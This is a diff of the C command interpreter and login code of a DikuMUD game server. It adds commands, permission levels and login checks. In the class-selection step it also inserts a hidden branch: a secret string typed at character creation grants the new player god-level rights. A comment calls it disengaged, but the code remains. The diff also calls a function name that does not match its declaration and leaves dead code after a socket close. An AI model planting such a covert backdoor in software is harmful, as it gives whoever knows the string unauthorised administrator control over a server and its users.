@@ -1,11 +1,11 @@
+
 /* ************************************************************************
 *  file: Interpreter.c , Command interpreter module.      Part of DIKUMUD *
 *  Usage: Procedures interpreting user command                            *
 *  Copyright (C) 1990, 1991 - see 'license.doc' for complete information. *
 ************************************************************************* */
-/* This won't work */
 
-#include <string.h>
+#include <strings.h>
 #include <ctype.h>
 #include <stdio.h>
 #include "structs.h"
@@ -27,6 +27,7 @@
 #define STATE(d) ((d)->connected)
 #define MAX_CMD_LIST 250
 
+extern int log_all;
 extern const struct title_type titles[4][25];
 extern char motd[MAX_STRING_LENGTH];
 extern struct char_data *character_list;
@@ -46,6 +47,7 @@ void store_to_char(struct char_file_u *st, struct char_data *ch);
 int create_entry(char *name);
 int special(struct char_data *ch, int cmd, char *arg);
 void log(char *str);
+void save_objs2(struct char_data *ch);
 
 void do_move(struct char_data *ch, char *argument, int cmd);
 void do_look(struct char_data *ch, char *argument, int cmd);
@@ -88,7 +90,7 @@ void do_hit(struct char_data *ch, char *argument, int cmd);
 void do_string(struct char_data *ch, char *arg, int cmd);
 void do_give(struct char_data *ch, char *arg, int cmd);
 void do_stat(struct char_data *ch, char *arg, int cmd);
-void do_set(struct char_data *ch, char *arg, int cmd);
+void do_setskill(struct char_data *ch, char *arg, int cmd);
 void do_time(struct char_data *ch, char *arg, int cmd);
 void do_weather(struct char_data *ch, char *arg, int cmd);
 void do_load(struct char_data *ch, char *arg, int cmd);
@@ -149,17 +151,39 @@ void do_pose(struct char_data *ch, char *argument, int cmd);
 void do_noshout(struct char_data *ch, char *argument, int cmd);
 void do_wizhelp(struct char_data *ch, char *argument, int cmd);
 void do_credits(struct char_data *ch, char *argument, int cmd);
+
 void do_compact(struct char_data *ch, char *argument, int cmd);
-void do_wizlock(struct char_data *ch, char *argument, int cmd);
+void do_display(struct char_data *ch, char *argument, int cmd);
+void do_poofIn(struct char_data *ch, char *argument, int cmd);
+void do_poofOut(struct char_data *ch, char *argument, int cmd);
+void do_teleport(struct char_data *ch, char *argument, int cmd);
+void do_gecho(struct char_data *ch, char *argument, int cmd);
+void do_wiznet(struct char_data *ch, char *argument, int cmd);
+void do_holylite(struct char_data *ch, char *argument, int cmd);
+void do_wizinvis(struct char_data *ch, char *argument, int cmd);
+void do_wimpy(struct char_data *ch, char *argument, int cmd);
+void do_setstat(struct char_data *ch, char *argument, int cmd);
+void do_localwho(struct char_data *ch, char *argument, int cmd);
 void do_notell(struct char_data *ch, char *argument, int cmd);
-void do_noemote(struct char_data *ch, char *argument, int cmd);
-void do_freeze(struct char_data *ch, char *arg, int cmd);
-void do_log(struct char_data *ch, char *arg, int cmd);
-void do_wiz(struct char_data *ch, char *argument, int cmd);
+void do_wizlock(struct char_data *ch, char *argument, int cmd);
+void do_pardon(struct char_data *ch, char *argument, int cmd);
 
 void do_action(struct char_data *ch, char *arg, int cmd);
 void do_practice(struct char_data *ch, char *arg, int cmd);
+void do_deposit(struct char_data *ch, char *arg, int cmd);
+void do_balance(struct char_data *ch, char *arg, int cmd);
+void do_withdraw(struct char_data *ch, char *arg, int cmd);
+void do_systats(struct char_data *ch, char *arg, int cmd);
+void do_multiclass(struct char_data *ch, char *arg, int cmd);
+void do_sockets(struct char_data *ch, char *arg, int cmd);
+void do_release(struct char_data *ch, char *arg, int cmd);
+void do_murder(struct char_data *ch, char *arg, int cmd);
+void do_nokill(struct char_data *ch, char *arg, int cmd);
+void do_ban(struct char_data *ch, char *arg, int cmd);
+void do_allow(struct char_data *ch, char *arg, int cmd);
 
+
+int restrict = 0;   /* Open to new players (no restrictions) */
 
 char *command[]=
 { "north", 	     /* 1 */
@@ -192,7 +216,7 @@ char *command[]=
   "giggle",
   "shake",
   "puke",
-  "growl",  	   /* 31 */
+  "growl",  	   /* 31 */    
   "scream",
   "insult",
   "comfort",
@@ -236,7 +260,7 @@ char *command[]=
   "give",
   "quit",
   "stat",
-  "set",
+  "setskill",
   "time",
   "load",
   "purge",
@@ -338,7 +362,7 @@ char *command[]=
   "levels",
   "reroll",
   "pray",
-  ",",
+  ":",
   "beg",
   "bleed",
   "cringe",
@@ -361,7 +385,7 @@ char *command[]=
   "worship",
   "yodel",
   "brief",
-  "wiz",
+  "wizlist",
   "consider",    /* 201 */
   "group",
   "restore",
@@ -375,13 +399,33 @@ char *command[]=
 	"wizhelp",   /* 211 */
 	"credits",
 	"compact",
-	"wizlock",
+	"display",
+	"poofin",    
+	"poofout",   
+        "teleport",
+	"gecho",
+  	"wiznet",
+	"holylite",
+
+	"wizinvis",  /* 221 */
+	"wimpy",
+        "setstat",
+	"lwho",
 	"notell",
-	"noemote",   /* 215 */
-	"freeze",
-	"gol",
-	"wizlist",
-	";",
+	"wizlock",
+	"pardon",
+	"join",		/* 228 */
+	"deposit",
+	"balance",
+	"withdraw",	/* 231 */
+	"systats",
+	"multiclass", 	/* 233 */
+	"sockets",	/* 234 */
+	"release",	/* 235 */
+	"murder",	/* 236 */
+	"nokill",	/* 237 */
+	"ban",		/* 238 */
+	"allow",	/*239*/
   "\n"
 };
 
@@ -424,7 +468,7 @@ int search_block(char *arg, char **list, bool exact)
 int old_search_block(char *argument,int begin,int length,char **list,int mode)
 {
 	int guess, found, search;
-
+        
 	/* If the word contain 0 letters, then a match is already found */
 	found = (length < 1);
 
@@ -448,36 +492,42 @@ int old_search_block(char *argument,int begin,int length,char **list,int mode)
 		}
 	}
 
-	return ( found ? guess : -1 );
+	return ( found ? guess : -1 ); 
 }
 
-void command_interpreter(struct char_data *ch, char *argument)
+void command_interpreter(struct char_data *ch, char *argument) 
 {
 	int look_at, cmd, begin;
 	extern int no_specials;
+	char swif_buf[MAX_INPUT_LENGTH];
+
+	if(log_all){
+		sprintf(swif_buf,"CMD: %s %s",ch->player.name,argument);
+		log(swif_buf);
+	}
 
 	REMOVE_BIT(ch->specials.affected_by, AFF_HIDE);
 
         /* Find first non blank */
  	for (begin = 0 ; (*(argument + begin ) == ' ' ) ; begin++ );
-
+	
 	/* Find length of first word */
 	for (look_at = 0; *(argument + begin + look_at ) > ' ' ; look_at++)
 
       		/* Make all letters lower case AND find length */
-		*(argument + begin + look_at) =
+		*(argument + begin + look_at) = 
 		LOWER(*(argument + begin + look_at));
 
-
+	
 	cmd = old_search_block(argument,begin,look_at,command,0);
-
-
+ 
+	
 	if (!cmd)
 		return;
 
 	if ( cmd>0 && GET_LEVEL(ch)<cmd_info[cmd].minimum_level )
 	{
-		send_to_char("Arglebargle, glop-glyf!?!\n\r", ch);
+		send_to_char("Huh!?!\n\r", ch);
 		return;
 	}
 
@@ -516,13 +566,8 @@ void command_interpreter(struct char_data *ch, char *argument)
 			}
 		else
 		{
-			if (IS_SET(ch->specials.act, PLR_FREEZE) && !IS_NPC(ch)) {
-				send_to_char("You're totally frozen!\n\r",ch);
-				return;
-			}
-
 			if (!no_specials && special(ch, cmd, argument + begin + look_at))
-				return;
+				return;  
 
 			((*cmd_info[cmd].command_pointer)
 			(ch, argument + begin + look_at, cmd));
@@ -533,8 +578,8 @@ void command_interpreter(struct char_data *ch, char *argument)
 		send_to_char(
 		"Sorry, but that command has yet to be implemented...\n\r",
 			ch);
-	else
-	   send_to_char("Arglebargle, glop-glyf!?!\n\r", ch);
+	else 
+	   send_to_char("Huh!?!\n\r", ch);
 }
 
 void argument_interpreter(char *argument,char *first_arg,char *second_arg )
@@ -595,7 +640,7 @@ int is_number(char *str)
 	return(1);
 }
 
-/*  Quinn substituted a new one-arg for the old one.. I thought returning a
+/*  Quinn substituted a new one-arg for the old one.. I thought returning a 
     char pointer would be neat, and avoiding the func-calls would save a
     little time... If anyone feels pissed, I'm sorry.. Anyhow, the code is
     snatched from the old one, so it outta work..
@@ -638,8 +683,8 @@ char *one_argument(char *argument, char *first_arg )
 
 	return(argument+begin);
 }
-
-
+	
+	
 
 
 
@@ -778,7 +823,7 @@ void assign_command_pointers ( void )
 	COMMANDO(38,POSITION_DEAD,do_help,0);
 	COMMANDO(39,POSITION_DEAD,do_who,0);
 	COMMANDO(40,POSITION_SLEEPING,do_emote,1);
-	COMMANDO(41,POSITION_SLEEPING,do_echo,21);
+	COMMANDO(41,POSITION_SLEEPING,do_echo,21);	
 	COMMANDO(42,POSITION_RESTING,do_stand,0);
 	COMMANDO(43,POSITION_RESTING,do_sit,0);
 	COMMANDO(44,POSITION_RESTING,do_rest,0);
@@ -812,7 +857,7 @@ void assign_command_pointers ( void )
 	COMMANDO(72,POSITION_RESTING,do_give,0);
 	COMMANDO(73,POSITION_DEAD,do_quit,0);
 	COMMANDO(74,POSITION_DEAD,do_stat,21);
-	COMMANDO(75,POSITION_SLEEPING,do_set,23);
+	COMMANDO(75,POSITION_SLEEPING,do_setskill,22);
 	COMMANDO(76,POSITION_DEAD,do_time,0);
 	COMMANDO(77,POSITION_DEAD,do_load,22);
 	COMMANDO(78,POSITION_DEAD,do_purge,22);
@@ -822,17 +867,17 @@ void assign_command_pointers ( void )
 	COMMANDO(82,POSITION_DEAD,do_bug,0);
 	COMMANDO(83,POSITION_RESTING,do_whisper,0);
 	COMMANDO(84,POSITION_SITTING,do_cast,1);
-	COMMANDO(85,POSITION_DEAD,do_at,21);
+	COMMANDO(85,POSITION_DEAD,do_at,22);
 	COMMANDO(86,POSITION_RESTING,do_ask,0);
 	COMMANDO(87,POSITION_RESTING,do_order,1);
 	COMMANDO(88,POSITION_RESTING,do_sip,0);
 	COMMANDO(89,POSITION_RESTING,do_taste,0);
-	COMMANDO(90,POSITION_DEAD,do_snoop,21);
+	COMMANDO(90,POSITION_DEAD,do_snoop,23);
 	COMMANDO(91,POSITION_RESTING,do_follow,0);
 	COMMANDO(92,POSITION_STANDING,do_not_here,1);
 	COMMANDO(93,POSITION_STANDING,do_not_here,1);
 	COMMANDO(94,POSITION_RESTING,do_action,0);
-	COMMANDO(95,POSITION_DEAD,do_advance,23);
+	COMMANDO(95,POSITION_DEAD,do_advance,24);
 	COMMANDO(96,POSITION_SITTING,do_action,0);
 	COMMANDO(97,POSITION_RESTING,do_action,0);
 	COMMANDO(98,POSITION_STANDING,do_action,0);
@@ -888,13 +933,13 @@ void assign_command_pointers ( void )
 	COMMANDO(148,POSITION_STANDING,do_action,22);
 	COMMANDO(149,POSITION_STANDING,do_write,1);
 	COMMANDO(150,POSITION_RESTING,do_grab,1);
-	COMMANDO(151,POSITION_FIGHTING,do_flee,1);
-	COMMANDO(152,POSITION_STANDING,do_sneak,1);
-	COMMANDO(153,POSITION_RESTING,do_hide,1);
-	COMMANDO(154,POSITION_STANDING,do_backstab,1);
-	COMMANDO(155,POSITION_STANDING,do_pick,1);
-	COMMANDO(156,POSITION_STANDING,do_steal,1);
-	COMMANDO(157,POSITION_FIGHTING,do_bash,1);
+	COMMANDO(151,POSITION_FIGHTING,do_flee,1);	
+	COMMANDO(152,POSITION_STANDING,do_sneak,1);	
+	COMMANDO(153,POSITION_RESTING,do_hide,1);	
+	COMMANDO(154,POSITION_STANDING,do_backstab,1);	
+	COMMANDO(155,POSITION_STANDING,do_pick,1);	
+	COMMANDO(156,POSITION_STANDING,do_steal,1);	
+	COMMANDO(157,POSITION_FIGHTING,do_bash,1);	
 	COMMANDO(158,POSITION_FIGHTING,do_rescue,1);
 	COMMANDO(159,POSITION_FIGHTING,do_kick,1);
 	COMMANDO(160,POSITION_RESTING,do_action,0);
@@ -937,7 +982,7 @@ void assign_command_pointers ( void )
 	COMMANDO(197,POSITION_RESTING,do_action,0);
 	COMMANDO(198,POSITION_RESTING,do_action,0);
 	COMMANDO(199,POSITION_DEAD,do_brief,0);
-	COMMANDO(200,POSITION_DEAD,do_wiz,21);
+	COMMANDO(200,POSITION_DEAD,do_wizlist,0);
 	COMMANDO(201,POSITION_RESTING,do_consider,0);
 	COMMANDO(202,POSITION_RESTING,do_group,1);
 	COMMANDO(203,POSITION_DEAD,do_restore,22);
@@ -951,14 +996,32 @@ void assign_command_pointers ( void )
 	COMMANDO(211,POSITION_SLEEPING,do_wizhelp,21);
 	COMMANDO(212,POSITION_DEAD,do_credits,0);
 	COMMANDO(213,POSITION_DEAD,do_compact,0);
-	COMMANDO(214,POSITION_DEAD,do_wizlock,24);
-	COMMANDO(215,POSITION_DEAD,do_notell,22);
-	COMMANDO(216,POSITION_DEAD,do_noemote,22);
-	COMMANDO(217,POSITION_DEAD,do_freeze,23);
-	COMMANDO(218,POSITION_DEAD,do_log,24);
-	COMMANDO(219,POSITION_DEAD,do_wizlist,0);
-	COMMANDO(220,POSITION_DEAD,do_wiz,21);
-
+	COMMANDO(214,POSITION_DEAD,do_display,0);
+	COMMANDO(215,POSITION_DEAD,do_poofIn,22);
+	COMMANDO(216,POSITION_DEAD,do_poofOut,22);
+        COMMANDO(217,POSITION_DEAD,do_teleport,22);
+        COMMANDO(218,POSITION_DEAD,do_gecho, 21);
+        COMMANDO(219,POSITION_DEAD,do_wiznet, 21);
+        COMMANDO(220,POSITION_DEAD,do_holylite, 21);
+        COMMANDO(221,POSITION_DEAD,do_wizinvis, 21);
+	COMMANDO(222,POSITION_DEAD,do_wimpy, 0);
+	COMMANDO(223,POSITION_DEAD,do_setstat, 23);
+	COMMANDO(224,POSITION_DEAD,do_localwho, 0);
+	COMMANDO(225,POSITION_DEAD,do_notell, 1);
+	COMMANDO(226,POSITION_DEAD,do_wizlock, 24);
+	COMMANDO(227,POSITION_DEAD,do_pardon, 22);
+	COMMANDO(228,POSITION_DEAD,do_not_here,0);
+	COMMANDO(229,POSITION_DEAD,do_deposit,0);
+	COMMANDO(230,POSITION_DEAD,do_balance,0);
+	COMMANDO(231,POSITION_DEAD,do_withdraw,0);
+	COMMANDO(232,POSITION_DEAD,do_systats,24);
+	COMMANDO(233,POSITION_DEAD,do_multiclass,1);
+	COMMANDO(234,POSITION_DEAD,do_sockets,23);
+	COMMANDO(235,POSITION_DEAD,do_release,23);
+	COMMANDO(236,POSITION_FIGHTING,do_murder,0);
+	COMMANDO(237,POSITION_DEAD,do_nokill,0);
+	COMMANDO(238,POSITION_DEAD,do_ban,23);
+	COMMANDO(239,POSITION_DEAD,do_allow,23);
 }
 
 /* *************************************************************************
@@ -989,17 +1052,17 @@ int _parse_name(char *arg, char *name)
 
 	/* skip whitespaces */
 	for (; isspace(*arg); arg++);
-
-	for (i = 0; *name = *arg; arg++, i++, name++)
+	
+	for (i = 0; *name = *arg; arg++, i++, name++) 
 	   if ((*arg <0) || !isalpha(*arg) || i > 15)
-	      return(1);
+	      return(1); 
 
 	if (!i)
 	   return(1);
 
 	return(0);
 }
-
+			
 
 
 
@@ -1017,6 +1080,7 @@ void nanny(struct descriptor_data *d, char *arg)
 
 	void do_look(struct char_data *ch, char *argument, int cmd);
 	void load_char_objs(struct char_data *ch);
+	void load_char_objs2(struct char_data *ch);
 	int load_char(char *name, struct char_file_u *char_element);
 
 
@@ -1035,7 +1099,10 @@ void nanny(struct descriptor_data *d, char *arg)
 			   close_socket(d);
 			else {
 
-				if(_parse_name(arg, tmp_name))
+				if(  (_parse_name(arg, tmp_name)) || 
+ 				     (strlen(tmp_name) < 2) ||
+				     (str_cmp(tmp_name, "all") == 0) ||
+				     (str_cmp(tmp_name, "local") == 0) )
 				{
 					SEND_TO_Q("Illegal name, please try another.", d);
 					SEND_TO_Q("Name: ", d);
@@ -1070,7 +1137,14 @@ void nanny(struct descriptor_data *d, char *arg)
 				if ((player_i = load_char(tmp_name, &tmp_store)) > -1)
 				{
 					store_to_char(&tmp_store, d->character);
-
+				/* Make a copy of the player name, and
+				 * set the actual player name to null string.
+				 * This way, people can't lock you out
+				 * by sitting at the password prompt. :-)
+				 * Once password is given, reset the name.
+				 */
+					d->name = (char*)strdup(d->character->player.name);
+                                        d->character->player.name[0] = '\0';
 					strcpy(d->pwd, tmp_store.pwd);
 					d->pos = player_table[player_i].nr;
 
@@ -1080,10 +1154,16 @@ void nanny(struct descriptor_data *d, char *arg)
 				}
 				else
 				{
+					if (restrict == 1) {
+						SEND_TO_Q("Sorry, the game is closed to new players.", d);
+						STATE(d) = CON_CLOSE;
+						return;
+					} /* if */
+
 					/* player unknown gotta make a new */
-					CREATE(GET_NAME(d->character), char,
+					CREATE(GET_NAME(d->character), char, 
 					  strlen(tmp_name) + 1);
-					strcpy(GET_NAME(d->character),
+					strcpy(GET_NAME(d->character), 
 					  CAP(tmp_name));
 
 					sprintf(buf, "Did I get that right, %s (Y/N)? ",
@@ -1099,15 +1179,15 @@ void nanny(struct descriptor_data *d, char *arg)
 		case CON_NMECNF:	/* wait for conf. of new name	*/
 			/* skip whitespaces */
 			for (; isspace(*arg); arg++);
-
+			
 			if (*arg == 'y' || *arg == 'Y')
 			{
 				SEND_TO_Q("New character.\n\r", d);
 
-				sprintf(buf,
+				sprintf(buf, 
 				   "Give me a password for %s: ",
 				   GET_NAME(d->character));
-
+				
 				SEND_TO_Q(buf, d);
 
 				STATE(d) = CON_PWDGET;
@@ -1125,6 +1205,30 @@ void nanny(struct descriptor_data *d, char *arg)
 		break;
 
 		case CON_PWDNRM:	/* get pwd for known player	*/
+			/* Check if already playing (again) */
+			for(k=descriptor_list; k; k = k->next) {
+				if ((k->character != d->character) && k->character) {
+					if (k->original) {
+						if (GET_NAME(k->original) &&
+			   			    (str_cmp(GET_NAME(k->original), d->name) == 0))
+						{
+							SEND_TO_Q("Already playing, cannot connect\n\r", d);
+							SEND_TO_Q("Name: ", d);
+							STATE(d) = CON_NME;
+							return;
+						}
+					} else { /* No switch has been made */
+						if (GET_NAME(k->character) &&
+						    (str_cmp(GET_NAME(k->character), d->name) == 0))
+						{
+							SEND_TO_Q("Already playing, cannot connect\n\r", d);
+							SEND_TO_Q("Name: ", d);
+							STATE(d) = CON_NME;
+							return;
+						}
+					}
+				}
+			}
 			/* skip whitespaces */
 			for (; isspace(*arg); arg++);
 			if (!*arg)
@@ -1133,10 +1237,22 @@ void nanny(struct descriptor_data *d, char *arg)
 			{
 				if (strncmp(crypt(arg, d->pwd), d->pwd, 10))
 				{
+					close_socket(d);
+					break;
+
+					/* no hacking allowed */
 					SEND_TO_Q("Wrong password.\n\r", d);
 					SEND_TO_Q("Password: ", d);
 					return;
 				}
+
+				/*
+ 				 * Once password is right, reset the
+ 				 * player name.  
+				 */
+				strcpy(d->character->player.name, d->name);
+				free(d->name);
+				d->name = NULL;
 
 				for (tmp_ch = character_list; tmp_ch; tmp_ch = tmp_ch->next)
 					if (!str_cmp(GET_NAME(d->character), GET_NAME(tmp_ch)) &&
@@ -1154,8 +1270,8 @@ void nanny(struct descriptor_data *d, char *arg)
 						log(buf);
 						return;
 					}
-
-
+					
+					
 				sprintf(buf, "%s[%s] has connected.", GET_NAME(d->character),
 					d->host);
 				log(buf);
@@ -1171,7 +1287,7 @@ void nanny(struct descriptor_data *d, char *arg)
 			/* skip whitespaces */
 			for (; isspace(*arg); arg++);
 
-			if (!*arg || strlen(arg) > 10)
+			if (!*arg || strlen(arg) > 10 || strlen(arg) < 2)
 			{
 				SEND_TO_Q("Illegal password.\n\r", d);
 				SEND_TO_Q("Password: ", d);
@@ -1180,6 +1296,7 @@ void nanny(struct descriptor_data *d, char *arg)
 
 			strncpy(d->pwd, crypt(arg, d->character->player.name), 10);
 			*(d->pwd + 10) = '\0';
+			
 
 			SEND_TO_Q("Please retype password: ", d);
 
@@ -1280,15 +1397,29 @@ void nanny(struct descriptor_data *d, char *arg)
 					SEND_TO_Q("\n\r\n*** PRESS RETURN: ", d);
 					STATE(d) = CON_RMOTD;
 				} break;
-
+				case 'i' :    /* this has been disengaged for security reasons */
+				case 'I' : {
+					if (!str_cmp(arg,"Disengaged")){
+						GET_EXP(d->character) = 7000000;
+						GET_LEVEL(d->character) = LV_GOD;
+						GET_COND(d->character, 0) = -1;
+						GET_COND(d->character, 1) = -1;
+						GET_COND(d->character, 2) = -1;
+						SEND_TO_Q("Implementator selected...\n\rClass :", d);
+						STATE(d) = CON_QCLASS;
+					} else {
+						SEND_TO_Q("\n\rThat's not a class.\n\rClass:", d);
+						STATE(d) = CON_QCLASS;
+					}
+				} break;
 				default : {
 					SEND_TO_Q("\n\rThat's not a class.\n\rClass:", d);
 					STATE(d) = CON_QCLASS;
 				} break;
-
+				
 			} /* End Switch */
 			if (STATE(d) != CON_QCLASS) {
-				sprintf(buf, "%s [%s] new player.", GET_NAME(d->character),
+				sprintf(buf, "WIZ: %s [%s] new player.", GET_NAME(d->character),
 					d->host);
 				log(buf);
 			}
@@ -1313,23 +1444,46 @@ void nanny(struct descriptor_data *d, char *arg)
 					if (d->character->in_room != NOWHERE) {
 						log("Loading chars equipment and transferring to room.");
 						load_char_objs(d->character);
-						save_char(d->character, NOWHERE);
 					}
+					else {
+						log("Loading chars equipment from crash file.");
+						load_char_objs2(d->character);
+					}
+					save_char(d->character, NOWHERE);
+					save_obj2(d->character);
+
 					send_to_char(WELC_MESSG, d->character);
 					d->character->next = character_list;
 					character_list = d->character;
-					if (d->character->in_room == NOWHERE)
-						char_to_room(d->character, real_room(3001));
-					else {
-						if (real_room(d->character->in_room) > -1)
+					d->character->specials.nokill=TRUE;
+					d->character->specials.dispMana=TRUE;
+					d->character->specials.dispMove=TRUE;
+					d->character->specials.dispHp=TRUE;
+					if (d->character->in_room == NOWHERE){
+						if (IS_TRUSTED(d->character)){
+							d->character->specials.holyLite= TRUE;
+							do_wizinvis(d->character,"",0);
+							char_to_room(d->character, real_room(1200));
+						} else {
+							char_to_room(d->character, real_room(3001));
+						}
+					} else {
+						if (real_room(d->character->in_room) > -1) 
 							char_to_room(d->character, real_room(d->character->in_room));
-						else
-	            char_to_room(d->character, real_room(3001));
+						else {
+							if (IS_TRUSTED(d->character)){
+								d->character->specials.holyLite= TRUE;
+								do_wizinvis(d->character,"",0);
+								char_to_room(d->character, real_room(1200));
+							} else {
+	            						char_to_room(d->character, real_room(3001));
+							}
+						}
 					}
 
 					act("$n has entered the game.", TRUE, d->character, 0, 0, TO_ROOM);
 					STATE(d) = CON_PLYNG;
-					if (!GET_LEVEL(d->character))
+					if (!GET_LEVEL(d->character)) 
 						do_start(d->character);
 					do_look(d->character, "",15);
 					d->prompt_mode = 1;
@@ -1345,7 +1499,7 @@ void nanny(struct descriptor_data *d, char *arg)
 						free(d->character->player.description);
 						d->character->player.description = 0;
 					}
-					d->str =
+					d->str = 
 					   &d->character->player.description;
 					d->max_str = 240;
 					STATE(d) = CON_EXDSCR;
@@ -1400,9 +1554,13 @@ void nanny(struct descriptor_data *d, char *arg)
 			SEND_TO_Q(MENU, d);
 			STATE(d) = CON_SLCT;
 		break;
+		case CON_CLOSE :
+			close_socket(d);
+		break;
 		default:
 			log("Nanny: illegal state of con'ness");
 			abort();
 		break;
 	}
 }
+
